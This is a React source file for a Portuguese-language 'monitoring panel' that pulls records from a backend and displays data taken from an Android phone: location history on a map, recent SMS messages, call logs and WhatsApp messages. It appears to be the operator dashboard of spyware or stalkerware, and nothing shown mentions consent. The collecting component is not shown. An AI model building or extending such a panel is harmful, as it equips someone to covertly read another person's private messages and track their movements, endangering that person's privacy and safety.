// src/App.js
import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { MapContainer, TileLayer, Marker, Popup } from 'react-leaflet';
import 'leaflet/dist/leaflet.css';
import L from 'leaflet';

// Fix para ícones do Leaflet
delete L.Icon.Default.prototype._getIconUrl;
L.Icon.Default.mergeOptions({
  iconRetinaUrl: 'https://unpkg.com/leaflet@1.7.1/dist/images/marker-icon-2x.png',
  iconUrl: 'https://unpkg.com/leaflet@1.7.1/dist/images/marker-icon.png',
  shadowUrl: 'https://unpkg.com/leaflet@1.7.1/dist/images/marker-shadow.png',
});

function App() {
  const [deviceData, setDeviceData] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  
  // URL do backend - configure no .env no ambiente de produção
  const API_URL = process.env.REACT_APP_API_URL || 'https://your-backend.onrender.com/api/data';

  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await axios.get(API_URL);
        setDeviceData(response.data);
        setLoading(false);
      } catch (err) {
        setError('Erro ao carregar dados');
        setLoading(false);
        console.error(err);
      }
    };

    fetchData();
  }, []);

  if (loading) {
    return <div className="loading">Carregando dados...</div>;
  }

  if (error) {
    return <div className="error">{error}</div>;
  }

  if (deviceData.length === 0) {
    return <div className="no-data">Nenhum dado encontrado</div>;
  }

  const latestData = deviceData[0];
  const validLocations = deviceData.filter(d => d.location && d.location.lat);

  return (
    <div className="app">
      <header>
        <h1>Painel de Monitoramento</h1>
      </header>

      <main>
        <section className="device-info">
          <h2>Informações do Dispositivo</h2>
          <p><strong>Modelo:</strong> {latestData.deviceInfo?.model}</p>
          <p><strong>Fabricante:</strong> {latestData.deviceInfo?.manufacturer}</p>
          <p><strong>Android:</strong> {latestData.deviceInfo?.androidVersion}</p>
          <p><strong>Última atualização:</strong> {new Date(latestData.timestamp).toLocaleString()}</p>
        </section>

        <section className="map-section">
          <h2>Localizações</h2>
          <div className="map-container">
            <MapContainer 
              center={validLocations[0] ? [validLocations[0].location.lat, validLocations[0].location.lng] : [0, 0]} 
              zoom={validLocations.length > 0 ? 13 : 2}
              style={{ height: '400px', width: '100%' }}
            >
              <TileLayer
                url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
                attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
              />
              
              {validLocations.map((data, index) => (
                <Marker 
                  key={index} 
                  position={[data.location.lat, data.location.lng]}
                >
                  <Popup>
                    <div>
                      <p><strong>Data:</strong> {new Date(data.timestamp).toLocaleString()}</p>
                      <p><strong>Modelo:</strong> {data.deviceInfo?.model}</p>
                    </div>
                  </Popup>
                </Marker>
              ))}
            </MapContainer>
          </div>
        </section>

        <section className="data-section">
          <h2>Dados Coletados</h2>
          
          {latestData.sms && latestData.sms.count > 0 && (
            <div className="data-group">
              <h3>SMS ({latestData.sms.count})</h3>
              <div className="scroll-container">
                {latestData.sms.list.slice(0, 10).map((sms, index) => (
                  <div key={index} className="sms-item">
                    <p><strong>De:</strong> {sms.address}</p>
                    <p>{sms.body}</p>
                    <p className="timestamp">{new Date(sms.date).toLocaleString()}</p>
                  </div>
                ))}
              </div>
            </div>
          )}

          {latestData.calls && latestData.calls.count > 0 && (
            <div className="data-group">
              <h3>Chamadas ({latestData.calls.count})</h3>
              <div className="scroll-container">
                {latestData.calls.list.slice(0, 10).map((call, index) => (
                  <div key={index} className="call-item">
                    <p><strong>Número:</strong> {call.number}</p>
                    <p><strong>Duração:</strong> {call.duration}s</p>
                    <p><strong>Tipo:</strong> {call.type === '1' ? 'Entrada' : call.type === '2' ? 'Perdida' : 'Saída'}</p>
                    <p className="timestamp">{new Date(call.date).toLocaleString()}</p>
                  </div>
                ))}
              </div>
            </div>
          )}

          {latestData.whatsapp && latestData.whatsapp.messages.length > 0 && (
            <div className="data-group">
              <h3>WhatsApp ({latestData.whatsapp.messages.length})</h3>
              <div className="scroll-container">
                {latestData.whatsapp.messages.slice(0, 10).map((msg, index) => (
                  <div key={index} className="whatsapp-item">
                    <p>{msg}</p>
                  </div>
                ))}
              </div>
            </div>
          )}
        </section>
      </main>

      <footer>
        <p>Sistema de Monitoramento &copy; {new Date().getFullYear()}</p>
      </footer>
    </div>
  );
}

export default App;
